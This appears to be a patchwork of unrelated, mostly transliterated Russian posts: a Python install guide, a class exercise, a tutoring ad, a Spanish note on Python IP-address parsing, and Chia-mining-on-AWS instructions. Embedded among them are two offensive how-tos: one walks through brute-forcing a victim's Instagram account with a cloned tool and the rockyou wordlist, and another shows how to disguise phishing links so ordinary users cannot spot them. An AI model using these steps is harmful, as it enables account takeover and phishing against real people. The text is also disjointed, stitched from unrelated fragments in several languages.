SSH dovol'no bezopasen, osobenno esli vy primete razumnye mery predostorozhnosti, takie kak trebovanie autentifikatsii na osnove pary kliuchei. Tem ne menee, v dikoi prirode po-prezhnemu sushchestvuet mnozhestvo botov, kotorye pytaiutsia naiti uiazvimye khosty, pytaias' voiti v sistemu s rasprostranennymi skomprometirovannymi imenami pol'zovatelei i paroliami, takimi kak root / root ili admin / admin. Khotia maloveroiatno, chto oni dob'iutsia uspekha, oni vse ravno budut ispol'zovat' vashu propusknuiu sposobnost' i generirovat' ogromnoe kolichestvo zhurnalov.

Privet, pomogaiu s resheniem zadach, laboratornykh rabot, kontrol'nykh rabot, pishu kursovye raboty, po sleduiushchim distsiplinam: Algebra Matematicheskii analiz Diskretnaia matematika Fizika OOP i SOLID C/C++ C#, F#, Java, JS+HTML+CSS Python3 Komp'iuternaia grafika Algoritmy i struktury dannykh Takzhe rassmotriu chto-to smezhnoe, opyt vypolneniia rabot 1 god, otzyvy imeiutsia (v ls)

No pomniu kogda byl na strime u Mikhaila (Portwine), on v KDE aktivno eto iuzaet i emu vrode nravit'sia. Poetomu dumaiu svoi poklonniki takogo resheniia budut i v Ubuntu! #n303 #RViA Prodolzhaem temu govoriashchikh zhivotnykh. Na kartinke kod, polnost'iu rabochii. Pervaia zadacha - perepisat' i posmotret' kak rabotaet. Vtoraia zadacha - poniat', kak rabotaet. I tret'ia zadacha - samostoiatel'naia rabota. V etoi nebol'shoi rabote, nemnogo poznakomimsia kak rabotaiut klassy v python3. V dannom primere est' klass Cow, kotoryi predstavliaet soboi ob'ekt s zadannymi svoistvami i metodami.  Dlia initsiatsii klassa ispol'zuetsia metod __init__() - eto konstruktor klassa, on vyzyvaetsia pri sozdanii ob'ekta. Krome konstruktora v klasse est' eshche dva metoda say() i loop() - opishite dlia chego oni nuzhny. V klasse est' tri svoistva - self.text, self.onLoop i self.cow - pervoe otvechaet za tekst soobshcheniia, vtoroe - flag, otmechaet nakhoditsia li klass v tsikle i tret'ia khranit izobrazhenie korovki.  A vot nemnogo voprosov dlia samostoiatel'nogo otveta: 1) Chto takoe self? 2) Zachem v tekste self.cow nuzhny peremennye v figurnykh skobkakh?  A vot samostoiatel'naia rabota: Sozdaite svoi klass, pridumaite svoe govoriashchee zhivotnoe (primery mozhno naiti v internete) Dobav'te v klass metod, pri vyzove kotorogo budet vyvoditsia sluchainoe soobshchenie (dlia etogo neobkhodimo sozdat' massiv s naborom slov, pri vyzove metoda vybiraetsia odno slovo i vyvoditsia) V osnovnoi tsikl dobav'te reaktsiiu na slovo "random", pri nem dolzhen srabatyvat' metod kotoryi vyvodit sluchainoe slovo.  Otvety na voprosy i samostoiatel'nuiu rabotu zhdu na pochte

Kak ustanovit' Python na komp'iuter i nachat' na niom pisat' Kak ustanovit' Python na komp'iuter i nachat' na niom pisat'   Onlain-kompiliatory Python khoro shi, kogda nuzh no byst ro pro te sti ro vat' chto-to pro stoe, no dlia pol no tsen noi rabo ty ikh nedo sta toch no. Chto by ispol' zo vat' vsiu moshch' Python, nuzh no usta no vit' ego na svoi kom p'iu ter, i togda mozh no pod kliu chat' k nemu liubye bib lio te ki i pisat' kod liuboi slozhnosti.  V etoi sta t'e poka zhem, kak usta no vit' Python pod Windows i kak s nim rabo tat'. Dlia MacOS vsio pochti to zhe samoe, a esli u vas Linux, to vy luch she nas zna e te, kak eto sdelat'.  Skachivanie i ustanovka Dlia nacha la nam nuzh no ska chat' usta nov shchik s ofi tsi al' no go sai ta -- python.org. Esli kachat' Python s dru gikh sai tov, mozh no pod tse pit' virus ili tro ian. Ska chi vai te pro gram my tol' ko s ofi tsi al' nykh saitov.  Nesmot ria na to, chto Python 3 vyshel 10 let nazad, do sikh por mno gie spo riat pro to, kakuiu ver siiu luch she ispol' zo vat' -- vto ruiu ili tre t'iu. My za pro gress, poeto mu kacha em Python 3, no vy mozhe te vybrat' liubuiu druguiu.  Na glav noi stra ni tse sra zu vidim bol' shuiu zhiol tuiu knop ku, na koto roi napi sa no <<Download Python>>. Nazhi ma em, sokhra nia em i zapus ka em fail. On vesit oko lo 25 megabait.   Bol' shaia zhiol taia knop ka, koto raia otve cha et za posled niuiu ver siiu Python.  Usta nov shchik spra shi va et, kak usta no vit' -- vsio sra zu ili khoti te chto-to nastro it'? Vybi ra em per vyi vari ant -- Install Now.  V kon tse usta nov ki pro gram ma pred lo zhit ubrat' ogra ni che nie na dli nu odnoi slu zheb noi pere men noi. Ona otve cha et za to, chto by vy ili dru gaia pro gram ma mog li zapu stit' Python pochti iz liubo go mesta. Dlia eto go nuzh no nazhat' tekst v ramke.  Kogda usta nov ka zakon chit sia, nuzh no pro ve rit', chto vsio bylo sde la no pra vil' no. Dlia eto go v komand noi stro ke nabe ri te py (lati ni tsei) ili python i nazhmi te kla vi shu vvo da. Esli vsio khoro sho, v otvet Python vam napi shet nomer svo ei ver sii i sbor ki i pred lo zhit neskol' ko komand dlia zna kom stva s soboi:  Vy s Python 3, pozdravliaem. Zapusk programm Poka nash Python mozhet rabo tat' tol' ko cherez komand nuiu stro ku -- kakie koman dy vve dio te, te on i vypol nit. Mno gim raz ra bot chi kam eto nra vit sia, no dlia star ta eto neudob no. Napri mer, chto by zapu stit' pro gram mu, nuzh no napi sat' v komand noi stro ke tak:  py polnoe_imia_faila  Pol noe imia ozna cha et, chto nuzh no napi sat' ne tol' ko nazva nie fai la, no i disk s pap koi, gde on nakho dit sia. Chto by bylo poniat nee, davai te voz' miom nash kod iz sta t'i pro tai mer na Python i sokhra nim ego v fai le time.py3 na dis ke D. Py3 ozna cha et, chto vnut ri eto go fai la budet kod na Python3. Mozh no pro sto nazvat' fail python.py, bez troi ki, no dlia neko to rykh momen tov eto mozhet byt' vazhno.  Teper', chto by zapu stit' nash kod, napi shem v komand noi stroke:  py D:\time.py3  Rezul' tat rabo ty -- vypol nen nyi algoritm:  Kak ustanovit' Python na komp'iuter i nachat' na niom pisat'  Podkliuchaem VS Code My uzhe ras ska zy va li ob etom redak to re koda -- on byst ryi, bes plat nyi i est' mno go pla gi nov. Chto by rabo tat' s Python-failami bylo pro shche, nauchim VS Code poni mat' i zapus kat' ikh. Dlia eto go nam nuzh no nai ti i usta no vit' spe tsi al' nyi pla gin dlia eto go iazy ka. Otkry va em vklad ku Ras shi re niia (Extensions) i pishem takoe:  tag:debuggers @sort:installs  V rezul' ta takh pois ka nakho dim Python i nazhi ma em Install:  Kak ustanovit' Python na komp'iuter i nachat' na niom pisat'  Zatem to zhe samoe dela em dlia pod svet ki sin tak si sa: pishem v Ras shi re ni iakh koman du ext:py3 i usta nav li va em pla gin MagicPython. Posle eto go pere za pus ka em VS Code, otkry va em nash fail i nazhi ma em F5. Kogda vypa da iu shchee okosh ko spro sit, s chem budem rabo tat' -- vybi ra em Python. V ito ge my polu cha em redak tor koda s nuzh noi nam pod svet koi sin tak si sa i rezul' ta tom rabo ty v tom zhe okne. Krasota!  Zapus ka em i otla zhi va em pro gram mu na Python v VS Code

Kak vzlomat' uchetnuiu zapis' Instagram [brut]    PRIMEChANIE: ne ozhidaite, chto vy smozhete vzlomat' liubuiu uchetnuiu zapis', kakuiu zakhotite! Eto prosto demonstratsiia togo, kak eto rabotaet! Dlia 100% raboty vam neobkhodimo bolee glubokoe ponimanie etogo!  Eto vsego lish' ataka Bruteforce, i ne stoit postoianno ozhidat' rezul'tatov.     Itak, pervoe, chto vam nuzhno, eto Kali Linux ili Parrot Sec OS ili liubaia drugaia OS Linux.    Vy mozhete skachat' OS Parrot zdes' https://parrotsec.org i kali Linux otsiuda kali.org   Teper' pristupim k rukovodstvu.  1. Itak, pervoe, chto vam nuzhno, eto setevoe soedinenie i mozg, i da, ne zabyvaite Linux, liuboi distributiv ili versiiu.  2. Itak, davaite nachnem s etogo uroka, ia budu ispol'zovat' tekhniku gruboi sily.  3. Grubaia sila - eto metod proverki sluchainykh parolei protiv odnogo pol'zovatelia iz zaranee opredelennogo nabora simvolov ili, bolee konkretno, my mozhem skazat', chto ia sobiraius' pogovorit' o atake po slovariu.  [Takim obrazom, ataka po slovariu - eto ataka, pri kotoroi paroli sokhraniaiutsia v faile, iz kotorogo my proveriaem eti paroli na odnom pol'zovatele.]   Khorosho, davaite nachnem i vypolnim sleduiushchie komandy.  > Otkryt' terminal  > apt update && apt ugrade -y  > apt-get install git  {ustanovka git dlia klonirovaniia repozitoriia}  > apt-get install python  {ustanovka python}  > apt-get install python3  {ustanovka python3}  > cd Desktop  {izmenenie kataloga na rabochii stol}  > git clone https://github.com/Pure-L0G1C/Instagram  {Eta komanda kloniruet repozitorii github}  Khorosho, poetomu posle zaversheniia klonirovaniia git nam nuzhno vypolnit' sleduiushchie komandy  > chmod + x Instagram  posle etogo vvodim  cd Instagram  > python instagram.py -h, chtoby poluchit' meniu spravki  Teper' prosto vvedite etu komandu  python / 2/3 instagram.py IMIa POL'ZOVATELIa ZhERTVY / Put'_faila_spiska_slov  [fail spiska slov uzhe po umolchaniiu v Linux ili popugai, prosto izvlekite rockyou v / usr / share / wordlists i zamenite put']   Esli parol' pol'zovatelia zadan, to eto srabotaet, no esli net, to vam ne povezlo, no vy mozhete poprobovat' drugie sposoby, esli khotite.  ---------------- Podelites' etim postom so svoimi druz'iami =)

Vsem privet, segodnia pokazhu kak zamaskirovat' fishing ssylku.  Esli vy khotiaby raz v zhizni pol'zovalis' instrumentami dlia sozdaniia fishing-ssylok, to vy prekrasno ponimaete, chto takoe "Ngrok" ili "Serveo". Podobnye ssylki vyzyvaiut sil'noe podozrenie, dazhe esli vy eio szhali nu dumaiu vse zhe znaiut chto takoe fishing  UrlPhish - eto utilita, sposobnaia maskirovat' fishing-ssylku dostatochno khorosho, chtoby samyi obychnyi iuzer dazhe ne smog dogadat'sia, chto ego khotiat vzlomat'. ------------------------------- 1) git clone https://github.com/termux-lab/UrlPhish  2) cd UrlPhish ------------------------------------------ 3) python3 urlp.py ------------------------- Vybiraete sait, ukazyvaete uzhe gotovuiu fishing ssylku, daiote ei nuzhnoe imia. Gotovo! I teper vzlomat' kogo-nibud' budet proshche. (Ustanovka utility po sozdaniiu fishing ssylki vot tut https://vk.com/wall-203714260_3)

Ideal'nyi sposob otlazhivat' i otslezhivat' prilozheniia -- khorosho opredelionnye, informativnye i udobno strukturirovannye logi. Oni iavliaiutsia neobkhodimym komponentom liubogo -- malogo, srednego ili krupnogo -- proekta na liubom iazyke programmirovaniia, ne tol'ko na Python. Ne ispol'zuite print() ili kornevoi logger po umolchaniiu, vmesto etogo nastroite logirovanie na urovne proekta. K startu novogo potoka kursa po Data Science, my pereveli stat'iu, avtor kotoroi reshil podelit'sia svoim shablonom dlia logirovaniia. Ne lishnim budet skazat', chto etot shablon prishiolsia po dushe mnogim spetsialistam -- ot data-saientistov professionalov i do razrabotchikov PO raznogo urovnia.

Una direccion IPv4 se puede expresar de varias formas, en decimal, entero, octal y hexadecimal, aunque el decimal es lo mas comun. Por ejemplo: 8.8.8.8 en octal es 0010.0010.0010.0010.Algo que sorprendera a muchos... si ponemos en el navegador https://0127.0.0.1 realmente nos redireccionara a https://87.0.0.1/. Eso es porque las secciones de una direccion IPv4 se pueden interpretar como octal si tienen el prefijo "0", de acuerdo con la especificacion original de IETF para direcciones IP ambiguas. Pero, ?que pasa en las versiones de Python de la 3.8.0 a a la 3.10? Pues que la libreria ipaddress elimina o descarta los ceros a la izquierda. De esta manera 010.8.8.8 acaba siendo 10.8.8.8:  $ python3.8Python 3.8.0 (default, Feb 25 2021, 22:10:10) [GCC 8.4.0] on linuxType "help", "copyright", "credits" or "license" for more information.>>> import subprocess>>> import ipaddress>>> >>> SUSPECT = '010.8.8.8'>>> >>> print(ipaddress.ip_network(SUSPECT, strict=True))10.8.8.8/32>>> >>> BAD_IP = ipaddress.ip_address(SUSPECT)>>> >>> print('http://'+str(BAD_IP))http://10.8.8.8>>>..

Sostavit' dokumentatsiiu k programme na Python3 Za-cha o khanoiskikh bashniakh   Est' gotovaia realizatsiia napisannaia na Python3 "klassiki kursovykh rabot" Modifitsirovannaia zadacha o Khanoiskikh bashniakh. Kod napisan s ispol'zovaniem bibliotek tkinter i math v 5 moduliakh (buttons.py  canvas.py  main.py  panel.py solver.py) vsego okolo 300 strok koda, soglasno usloviiu zadaniia (fail vo vlozhenii). Neobkhodimo napisat' glavu dlia kursovoi raboty ob algoritme dannoi realizatsii,  poiasnit' pochemu vybran takoi algoritm i biblioteki, chto vypolniaet kazhdyi modul', snabdit' klassy i ikh metody kratkimi komentariiami o logike ikh raboty i naznachenii, mozhno na russkom iazyke, eto ne printsipial'no, dobavit' nemnogo "vodichki" dlia ob'ema itogovogo teksta. Chto to vrode rukovodstva-tutoriala stat'i. Tekst i iskhodnyi kod s sokhraneniem formatirovaniia nuzhno oformit' ispol'zuia Microsoft Office Word. Neobkhodimo sobliusti trebovanie antiplagiata k original'nosti teksta >= 70%. Shrift TimesNewRoman 14, mezhstrochnyi interval 1,5, polia standartnye.  Po ob'emu okolo 30 stranits vkliuchaia iskhodnyi kod.  https://freelancehunt.com/project/sostavit-dokumentatsiyu-programme-na-python3/889842.html?utm_source=vk&utm_medium=social&utm_campaign=new_projects

I built some wheels for the new Tensorflow 2.5.0rc3 with CUDA 11 and cuDNN 8 in case anyone finds them useful. This includes SSE4.X,AVX2,FMA instructions: I usually build these for skylake march (and in this case with glibc 2.33) or other architectures on request, depending on my availability.

Amazon pozvolit mainit' kriptovaliutu Chia. Kak eto sdelat'?  Kompaniia Amazon predstavila reshenie dlia maininga kriptovaliuty Chia na baze svoego oblachnogo servisa Amazon Web Services (AWS). Informatsiia ob etom byla opublikovana v kitaiskom segmente saita AWS, gde voznik azhiotazh vokrug dobychi novoi kriptovaliuty.    Kak nachat' mainit' Chia s Amazon   Shag 1. Pol'zovateliam obeshchaiut bystroe razvertyvanie infrastruktury dlia maininga - soglasno predstavlennoi instruktsii, podkliuchenie zanimaet vsego 5 minut. Dlia etogo pol'zovatel' dolzhen stat' klientom Amazon, posle chego podkliuchit'sia k servisu Amazon Elastic Compute Cloud (Amazon EC2), kotoryi predostavliaet vychislitel'nye moshchnosti v oblake. Tam neobkhodimo vybrat' sistemu Amazon Linux 2 i model' i3.xlarge. Razmer pamiati ustanavlivaetsia na 30 Gb.    Shag 2. Sozdaem razdel instansa na diske.    sudo fdisk /dev/nvme0n1    Shag 3. Sozdaem failovuiu sistemu na instanse.    sudo mkfs -t xfs/dev/nvme0n1p1    Shag 4. Montiruem failovuiu sistemu.    sudo mount /dev/nvme0n1p1 /tmp1    Shag 5. Modifitsiruem razresheniia dlia pol'zovatelia ec2-user.    sudo chown -R ec2-user.ec2-user /tmp1    Shag 6. Sozdaem baket resursov v konsoli AWS, ustanavlivaem programmu goofys dlia montirovaniia baketov i montiruem cherez nee failovuiu sistemu.   Shag 7. Vvodim komandu df -h, chtoby podtverdit' dostup pol'zovatelia ec2-user k failovym sistemam /tmp1 i /home/ec2-user/chia  Shag 8. Ustanavlivaem kod Chia.    sudo yum update -y  sudo yum install python3 git -y  git clone https://github.com/Chia-Network/chia-blockchain.git -b latest --recurse-submodules  cd chia-blockchain  chmod +x ./install. sh  sh install.sh  . ./activate   Shag 9. Ustanavlivaem i vypolniaem komandu initsializatsii dlia sozdaniia adresa koshel'ka.    chia init    Shag 10. Sozdaem adres koshel'ka.    chia keys generate    Al'ternativno mozhno vvesti chia keys add i vstavit' mnemonicheskuiu frazu.  Shag 11. Zapuskaem protsess Chia.    chia start farmer    Shag 12. Mainim!   Shag 13. Proveriaem status maininga.   Poskol'ku eto novyi servis, pol'zovateli eshche ne uspeli otsenit' vygodnost' takogo varianta dobychi, odnako on iavno dostupnee ustanovki sobstvennoi sistemy. Krome togo, maineram v AWS ne pridetsia bespokoit'sia iz-za iznosa oborudovaniia, kotoryi kharakteren dlia sviazannykh s dobychei kriptovaliut protsessov i v chastnosti Chia.    Chto proiskhodit s Chia    Chia byl anonsirovan v 2017 godu sozdatelem protokola dlia piringovogo failoobmena BitTorrent Bremom Koenom. V 2018 godu on privlek na razrabotku $3 mln nachal'nogo finansirovaniia, posle chego eshche $28 mln v khode dvukh sleduiushchikh raundov.    Proekt pozitsioniruetsia v kachestve bolee ekologichnoi al'ternativy bitkoina i efira za schet togo, chto ego maining osushchestvliaetsia pri pomoshchi nakopitelei dannykh. V rezul'tate protsess dobychi stanovitsia znachitel'no menee energozatratnym. Dlia etogo Chia ispol'zuet razrabotannyi Koenom mekhanizm konsensusa <<Dokazatel'stvo prostranstvo>> ili Proof-of-Space.    19 marta sostoialsia zapusk osnovnoi seti Chia. Interes k dobyche kriptovaliuty uzhe vyzval defitsit nakopitelei na aziatskikh rynkakh. V nastoiashchee vremia resurs seti otsenivaetsia v bolee chem 1 eksabait, chto sootvetstvuet 1 mln diskov na 1 Tb kazhdyi.    V nachale nedeli XCH, takoi tiker imeet sobstvennaia kriptovaliuta seti Chia, nachal torgovat'sia na birzhakh. Pri startovoi tsene v $1 600 XCH bystro podnialsia do maksimuma v $1 819, odnako zatem otnositel'no stabilizirovalsia okolo $600.  #bitkoin #Kriptovaliuta #eferium #laitkoin #novosti_kriptovaliut #maining
Tekhnologicheskii gigant Amazon predstavil reshenie, prednaznachennoe dlia maininga kriptovaliuty Chia na svoei platforme oblachnykh vychislenii AWS.

Kak nachat' mainit' Chia s Amazon?   Shag 1 .  Pol'zovateliam obeshchaiut bystroe razvertyvanie infrastruktury dlia maininga - soglasno predstavlennoi instruktsii, podkliuchenie zanimaet vsego 5 minut. Dlia etogo pol'zovatel' dolzhen stat' klientom Amazon, posle chego podkliuchit'sia k servisu Amazon Elastic Compute Cloud (Amazon EC2), kotoryi predostavliaet vychislitel'nye moshchnosti v oblake. Tam neobkhodimo vybrat' sistemu Amazon Linux 2 i model' i3.xlarge. Razmer pamiati ustanavlivaetsia na 30 Gb. Shag 2 .  Sozdaem razdel instansa na diske.  sudo fdisk /dev/nvme0n1 Shag 3 . Sozdaem failovuiu sistemu na instanse.  sudo mkfs -t xfs/dev/nvme0n1p1 Shag 4 .  Montiruem failovuiu sistemu.  sudo mount /dev/nvme0n1p1 /tmp1 Shag 5 .  Modifitsiruem razresheniia dlia pol'zovatelia ec2-user.  sudo chown -R ec2-user.ec2-user /tmp1 Shag 6 .  Sozdaem baket resursov v konsoli AWS, ustanavlivaem programmu goofys dlia montirovaniia baketov i montiruem cherez nee failovuiu sistemu.  wget https://github.com/kahing/goofys/releases/latest/download/goofys chmod u+x goofys mkdir /home/ec2-user/chia sudo ./goofys --uid 1000 --gid 1000 -o allow_other s3_bucket /home/ec2-user/chia Shag 7 .  Vvodim komandu df -h, chtoby podtverdit' dostup pol'zovatelia ec2-user k failovym sistemam /tmp1 i /home/ec2-user/chia Shag 8 .  Ustanavlivaem kod Chia.  sudo yum update -y sudo yum install python3 git -y git clone https://github.com/Chia-Network/chia-blockchain.git -b latest --recurse-submodules cd chia-blockchain chmod +x ./install. sh sh install.sh . ./activate Shag 9 .  Ustanavlivaem i vypolniaem komandu initsializatsii dlia sozdaniia adresa koshel'ka.  chia init Shag 1 0 .  Sozdaem adres koshel'ka. chia keys generate Al'ternativno mozhno vvesti chia keys add i vstavit' mnemonicheskuiu frazu. Shag 1 1 .  Zapuskaem protsess Chia.  chia start farmer Shag 1 2 .  Mainim! nohup chia plots create -k 32 -b 6000 -r 2 -n 2 -t /tmp1 -2 /tmp1 -d /home/ec2-user/chia >> plots1.log 2>&1 & Shag 1 3 .  Proveriaem status maininga.  chia farm summary  Farming status: Farming Total chia farmed: 0.0 User transaction fees: 0.0 Block rewards: 0.0 Last height farmed: 0 Plot count: 2 Total size of plots: 202.773. GiB  Dannyi variant dobychi Chia iavno dostupnee ustanovki sobstvennoi sistemy. Krome togo, maineram v AWS ne pridetsia bespokoit'sia iz-za iznosa oborudovaniia, kotoryi kharakteren dlia sviazannykh s dobychei kriptovaliut. _ C uvazheniem, komanda WEB INVEST
